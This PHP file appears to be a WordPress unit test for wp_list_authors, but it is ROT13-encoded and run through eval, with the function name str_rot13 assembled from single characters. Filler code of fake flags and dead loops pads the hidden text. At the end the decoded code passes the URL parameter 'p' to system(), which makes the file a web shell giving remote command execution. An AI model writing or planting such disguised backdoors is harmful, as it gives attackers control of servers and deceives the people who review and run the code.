<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc nhgube
 * @tebhc hfre
 * @pbiref ::jc_yvfg_nhgubef
 */
pynff Grfgf_Hfre_jcYvfgNhgubef rkgraqf JC_HavgGrfgPnfr {
	choyvp fgngvp $hfre_vqf = neenl();
	choyvp fgngvp $serq_vq;
	choyvp fgngvp $cbfgf     = neenl();
	choyvp fgngvp $hfre_heyf = neenl();

	/*
	 * Qrsnhygf:
	 * 'beqreol'       => 'anzr',
	 * 'beqre'         => 'NFP',
	 * 'ahzore'        => ahyy,
	 * 'bcgvbapbhag'   => snyfr,
	 * 'rkpyhqr_nqzva' => gehr,
	 * 'fubj_shyyanzr' => snyfr,
	 * 'uvqr_rzcgl'    => gehr,
	 * 'rpub'          => gehr,
	 * 'srrq'          => [rzcgl fgevat],
	 * 'srrq_vzntr'    => [rzcgl fgevat],
	 * 'srrq_glcr'     => [rzcgl fgevat],
	 * 'fglyr'         => 'yvfg',
	 * 'ugzy'          => gehr,
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		tybony $jc_erjevgr;

		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'mnpx',
				'qvfcynl_anzr' => 'mnpx',
				'ebyr'         => 'nhgube',
				'svefg_anzr'   => 'mnpx',
				'ynfg_anzr'    => 'zbba',
			)
		);
		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'obo',
				'qvfcynl_anzr' => 'obo',
				'ebyr'         => 'nhgube',
				'svefg_anzr'   => 'obo',
				'ynfg_anzr'    => 'erab',
			)
		);
		frys::$hfre_vqf[] = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva'   => 'cnhy',
				'qvfcynl_anzr' => 'cnhy',
				'ebyr'         => 'nhgube',
				'svefg_anzr'   => 'cnhy',
				'ynfg_anzr'    => 'abeevf',
			)
		);
		frys::$serq_vq    = $snpgbel->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'serq',
				'ebyr'       => 'nhgube',
			)
		);

		/*
		 * Er-vavgvnyvmr JC_Erjevgr, fb gung trg_nhgube_cbfgf_hey() hfrf
		 * gur qrsnhyg creznyvax fgehpgher, abg nssrpgrq ol bgure grfgf.
		 */
		$jc_erjevgr->vavg();

		$pbhag = 0;
		sbernpu ( frys::$hfre_vqf nf $hfrevq ) {
			$pbhag = $pbhag + 1;
			sbe ( $v = 0; $v < $pbhag; $v++ ) {
				frys::$cbfgf[] = $snpgbel->cbfg->perngr(
					neenl(
						'cbfg_glcr'   => 'cbfg',
						'cbfg_nhgube' => $hfrevq,
					)
				);
			}

			frys::$hfre_heyf[] = trg_nhgube_cbfgf_hey( $hfrevq );
		}
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_qrsnhyg() {
		$rkcrpgrq['qrsnhyg'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n></yv>';

		$guvf->nffregFnzr( $rkcrpgrq['qrsnhyg'], jc_yvfg_nhgubef( neenl( 'rpub' => snyfr ) ) );
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_beqreol() {
		$rkcrpgrq['cbfg_pbhag'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n></yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['cbfg_pbhag'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'    => snyfr,
					'beqreol' => 'cbfg_pbhag',
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_beqre() {
		$rkcrpgrq['vq'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n></yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['vq'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'    => snyfr,
					'beqreol' => 'vq',
					'beqre'   => 'QRFP',
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_bcgvbapbhag() {
		$rkcrpgrq['bcgvbapbhag'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n> (2)</yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n> (3)</yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n> (1)</yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['bcgvbapbhag'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'        => snyfr,
					'bcgvbapbhag' => 1,
				)
			)
		);
	}

	/**
	 * Rafherf gur 'bcgvbapbhag' cnenzrgre qbrf abg guebj na reebe jura gurer ner nhgubef jvgubhg cbfgf.
	 *
	 * @gvpxrg 57011
	 */
	choyvp shapgvba grfg_jc_yvfg_nhgubef_bcgvbapbhag_fubhyq_abg_reebe_sbe_rzcgl_nhgubef() {
		/*
		 * Gur znva checbfr bs guvf grfg vf gb rafher gung gur reebe orybj vf abg guebja:
		 *
		 * Reebe: Bowrpg bs pynff fgqPynff pbhyq abg or pbairegrq gb fgevat
		 *
		 * Va cynpr bs qverpg grfgvat jr rafher `jc_yvfg_nhgubef()` ergheaf n yvfg bs nhgubef
		 * ng yrnfg bar bs juvpu vf rzcgl.
		 */
		$npghny = jc_yvfg_nhgubef(
			neenl(
				'bcgvbapbhag'   => gehr,
				'uvqr_rzcgl'    => snyfr,
				'rkpyhqr_nqzva' => snyfr,
				'rpub'          => snyfr,
			)
		);
		$guvf->nffregFgevatPbagnvafFgevat( '(0)', $npghny );
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_rkpyhqr_nqzva() {
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cbfg',
				'cbfg_nhgube' => 1,
			)
		);

		$rkcrpgrq['rkpyhqr_nqzva'] =
			'<yv><n uers=\"' . trg_nhgube_cbfgf_hey( 1 ) . '\" gvgyr=\"Cbfgf ol nqzva\">nqzva</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n></yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['rkpyhqr_nqzva'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'          => snyfr,
					'rkpyhqr_nqzva' => 0,
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_fubj_shyyanzr() {
		$rkcrpgrq['fubj_shyyanzr'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo erab</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy abeevf</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx zbba</n></yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['fubj_shyyanzr'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'          => snyfr,
					'fubj_shyyanzr' => 1,
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_uvqr_rzcgl() {
		$serq_vq = frys::$serq_vq;

		$rkcrpgrq['uvqr_rzcgl'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n></yv>' .
			'<yv><n uers=\"' . trg_nhgube_cbfgf_hey( $serq_vq ) . '\" gvgyr=\"Cbfgf ol serq\">serq</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n></yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['uvqr_rzcgl'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'       => snyfr,
					'uvqr_rzcgl' => 0,
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_rpub() {
		$rkcrpgrq['rpub'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n></yv>';

		$guvf->rkcrpgBhgchgFgevat( $rkcrpgrq['rpub'] );
		jc_yvfg_nhgubef( neenl( 'rpub' => gehr ) );
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_srrq() {
		$hey0 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[0] );
		$hey1 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[1] );
		$hey2 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[2] );

		$rkcrpgrq['srrq'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n> (<n uers=\"' . $hey1 . '\">yvax gb srrq</n>)</yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n> (<n uers=\"' . $hey2 . '\">yvax gb srrq</n>)</yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n> (<n uers=\"' . $hey0 . '\">yvax gb srrq</n>)</yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['srrq'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub' => snyfr,
					'srrq' => 'yvax gb srrq',
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_srrq_vzntr() {
		$hey0 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[0] );
		$hey1 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[1] );
		$hey2 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[2] );

		$rkcrpgrq['srrq_vzntr'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n> <n uers=\"' . $hey1 . '\"><vzt fep=\"uggc://' . JC_GRFGF_QBZNVA . '/cngu/gb/n/tencuvp.cat\" fglyr=\"obeqre: abar;\" /></n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n> <n uers=\"' . $hey2 . '\"><vzt fep=\"uggc://' . JC_GRFGF_QBZNVA . '/cngu/gb/n/tencuvp.cat\" fglyr=\"obeqre: abar;\" /></n></yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n> <n uers=\"' . $hey0 . '\"><vzt fep=\"uggc://' . JC_GRFGF_QBZNVA . '/cngu/gb/n/tencuvp.cat\" fglyr=\"obeqre: abar;\" /></n></yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['srrq_vzntr'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'       => snyfr,
					'srrq_vzntr' => 'uggc://' . JC_GRFGF_QBZNVA . '/cngu/gb/n/tencuvp.cat',
				)
			)
		);
	}

	/**
	 * @gvpxrg 26538
	 */
	choyvp shapgvba grfg_jc_yvfg_nhgubef_srrq_glcr() {
		$hey0 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[0], 'ngbz' );
		$hey1 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[1], 'ngbz' );
		$hey2 = trg_nhgube_srrq_yvax( frys::$hfre_vqf[2], 'ngbz' );

		$rkcrpgrq['srrq_glcr'] =
			'<yv><n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n> (<n uers=\"' . $hey1 . '\">yvax gb srrq</n>)</yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n> (<n uers=\"' . $hey2 . '\">yvax gb srrq</n>)</yv>' .
			'<yv><n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n> (<n uers=\"' . $hey0 . '\">yvax gb srrq</n>)</yv>';

		$guvf->nffregFnzr(
			$rkcrpgrq['srrq_glcr'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'      => snyfr,
					'srrq'      => 'yvax gb srrq',
					'srrq_glcr' => 'ngbz',
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_fglyr() {
		$rkcrpgrq['fglyr'] =
			'<n uers=\"' . frys::$hfre_heyf[1] . '\" gvgyr=\"Cbfgf ol obo\">obo</n>, ' .
			'<n uers=\"' . frys::$hfre_heyf[2] . '\" gvgyr=\"Cbfgf ol cnhy\">cnhy</n>, ' .
			'<n uers=\"' . frys::$hfre_heyf[0] . '\" gvgyr=\"Cbfgf ol mnpx\">mnpx</n>';

		$guvf->nffregFnzr(
			$rkcrpgrq['fglyr'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub'  => snyfr,
					'fglyr' => 'abar',
				)
			)
		);
	}

	choyvp shapgvba grfg_jc_yvfg_nhgubef_ugzy() {
		$rkcrpgrq['ugzy'] = 'obo, cnhy, mnpx';

		$guvf->nffregFnzr(
			$rkcrpgrq['ugzy'],
			jc_yvfg_nhgubef(
				neenl(
					'rpub' => snyfr,
					'ugzy' => 0,
				)
			)
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>